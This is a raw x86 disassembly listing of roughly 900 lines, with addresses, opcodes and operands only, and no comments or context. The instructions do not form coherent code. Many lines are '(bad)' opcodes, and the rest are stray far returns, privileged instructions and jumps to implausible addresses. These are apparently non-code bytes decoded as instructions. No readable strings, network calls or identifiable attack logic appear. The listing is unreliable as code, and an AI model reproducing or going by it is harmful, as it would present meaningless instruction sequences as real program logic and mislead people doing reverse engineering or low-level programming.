  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
  40e57e:	dec    ebp
  40e57f:	inc    ebp
  40e580:	xor    edi,DWORD PTR [eax-0x7167afd]
  40e586:	add    BYTE PTR [ebp+0x0],al
  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
